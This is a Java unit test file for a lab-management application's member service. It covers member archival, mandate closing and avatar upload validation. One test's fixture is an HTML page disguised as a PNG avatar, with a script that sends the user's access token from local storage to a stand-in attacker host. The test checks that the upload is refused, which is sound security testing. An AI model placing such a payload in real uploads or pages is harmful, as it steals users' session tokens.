package com.lias.labmanagement.members.service;

import com.lias.labmanagement.audit.service.AuditService;
import com.lias.labmanagement.common.enums.MemberStatus;
import com.lias.labmanagement.common.enums.RoleChangeSource;
import com.lias.labmanagement.members.dto.ReturnAffiliationRequest;
import com.lias.labmanagement.members.entity.AffiliationHistory;
import com.lias.labmanagement.common.exception.BadRequestException;
import com.lias.labmanagement.common.storage.FileStorageService;
import com.lias.labmanagement.common.storage.StoredFile;
import com.lias.labmanagement.governance.service.MandateService;
import com.lias.labmanagement.governance.service.UserRoleSyncService;
import com.lias.labmanagement.members.entity.Member;
import com.lias.labmanagement.members.mapper.MemberMapper;
import com.lias.labmanagement.members.repository.AffiliationHistoryRepository;
import com.lias.labmanagement.members.repository.MemberRepository;
import com.lias.labmanagement.members.repository.MemberStatusHistoryRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InOrder;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.mock.web.MockMultipartFile;

import java.nio.charset.StandardCharsets;
import java.time.LocalDate;
import java.util.Optional;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.inOrder;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.verifyNoInteractions;
import static org.mockito.Mockito.when;

/**
 * STATUT / RÔLE / MANDAT are three distinct concepts, but none of them may survive the
 * archival of the member they belong to: archiving a member must close every mandate they
 * still hold, exactly like the RETIRED/FORMER transition already does. Otherwise the
 * governance screens keep displaying an archived member as the officer in exercise
 * ("Direction en exercice — Membre archivé").
 */
@ExtendWith(MockitoExtension.class)
class MemberServiceTest {

    @Mock private MemberRepository memberRepository;
    @Mock private MemberStatusHistoryRepository statusHistoryRepository;
    @Mock private AffiliationHistoryRepository affiliationHistoryRepository;
    @Mock private MemberMapper mapper;
    @Mock private AuditService auditService;
    @Mock private FileStorageService fileStorageService;
    @Mock private MandateService mandateService;
    @Mock private UserRoleSyncService userRoleSyncService;

    @InjectMocks private MemberService service;

    private Member member;
    private UUID memberId;

    @BeforeEach
    void setUp() {
        memberId = UUID.randomUUID();
        member = Member.builder()
                .firstName("Amine").lastName("Tazi")
                .email("amine.tazi@example.org")
                .currentStatus(MemberStatus.PERMANENT)
                .build();
        member.setId(memberId);
    }

    @Test
    void archivingAMemberClosesEveryMandateTheyStillHold() {
        when(memberRepository.findById(memberId)).thenReturn(Optional.of(member));

        service.delete(memberId);

        verify(mandateService).endAllActiveMandatesForMember(eq(memberId), eq(LocalDate.now()), any(String.class));
    }

    @Test
    void archivingAMemberRecomputesTheirEffectiveRole() {
        when(memberRepository.findById(memberId)).thenReturn(Optional.of(member));

        service.delete(memberId);

        verify(userRoleSyncService).syncForMember(member, RoleChangeSource.MANDATE_CHANGE);
    }

    @Test
    void archivingSoftDeletesWithoutTouchingHistorizedData() {
        when(memberRepository.findById(memberId)).thenReturn(Optional.of(member));

        service.delete(memberId);

        assertThat(member.isDeleted()).isTrue();
        verify(memberRepository).save(member);
        // Historized data (status periods, affiliation periods) is never rewritten by archival.
        verify(statusHistoryRepository, never()).save(any());
        verify(affiliationHistoryRepository, never()).save(any());
    }

    @Test
    void mandatesAreClosedBeforeTheMemberRowIsArchived() {
        when(memberRepository.findById(memberId)).thenReturn(Optional.of(member));

        service.delete(memberId);

        // Order matters: once the row is flagged deleted, @SQLRestriction hides it from the
        // very queries that would be needed to find and close the mandates.
        InOrder order = inOrder(mandateService, memberRepository);
        order.verify(mandateService)
                .endAllActiveMandatesForMember(eq(memberId), any(LocalDate.class), any(String.class));
        order.verify(memberRepository).save(member);
    }

    /*
     * Avatars are served from /files/public/** without authentication, on the application's
     * origin, with a type derived from the file extension. An HTML page uploaded as an
     * "image" ran as a page of LIAS and could read the access token from local storage.
     */

    @Test
    void returningAnActiveMemberIsRejected() {
        // member is PERMANENT (active) — see setUp
        when(memberRepository.findById(memberId)).thenReturn(Optional.of(member));

        assertThatThrownBy(() -> service.returnToLab(memberId,
                new ReturnAffiliationRequest(LocalDate.now(), MemberStatus.PERMANENT), MemberStatus.PERMANENT))
                .isInstanceOf(BadRequestException.class);
        verify(affiliationHistoryRepository, never()).save(any());
    }

    @Test
    void returningAFormerMemberOpensANewAffiliationPeriod() {
        member.setCurrentStatus(MemberStatus.FORMER);
        when(memberRepository.findById(memberId)).thenReturn(Optional.of(member));
        when(memberRepository.save(member)).thenReturn(member);

        service.returnToLab(memberId,
                new ReturnAffiliationRequest(LocalDate.now(), MemberStatus.PERMANENT), MemberStatus.PERMANENT);

        verify(affiliationHistoryRepository).save(any(AffiliationHistory.class));
        verify(userRoleSyncService).syncForMember(eq(member), any(RoleChangeSource.class));
    }

    @Test
    void aPageDisguisedAsAnImageIsRefusedWhateverItsDeclaredType() {
        MockMultipartFile disguised = new MockMultipartFile("file", "photo.html", "image/png",
                "<!doctype html><script>fetch('//evil.example/?t='+localStorage.lias_access_token)</script>"
                        .getBytes(StandardCharsets.UTF_8));

        assertThatThrownBy(() -> service.uploadAvatar(UUID.randomUUID(), disguised))
                .isInstanceOf(BadRequestException.class);
        verifyNoInteractions(fileStorageService);
    }

    @Test
    void aRealImageIsStoredUnderTheExtensionOfItsContentNotOfItsName() {
        UUID userId = UUID.randomUUID();
        byte[] png = {(byte) 0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 0x0D};
        MockMultipartFile image = new MockMultipartFile("file", "photo.html", "image/png", png);
        when(memberRepository.findByUserId(userId)).thenReturn(Optional.of(member));
        when(memberRepository.save(member)).thenReturn(member);
        when(fileStorageService.store(image, "public/avatars", ".png"))
                .thenReturn(new StoredFile("x.png", "photo.html", "image/png", png.length, "public/avatars/x.png"));

        service.uploadAvatar(userId, image);

        verify(fileStorageService).store(image, "public/avatars", ".png");
        assertThat(member.getPhotoUrl()).isEqualTo("/files/public/avatars/x.png");
    }
}
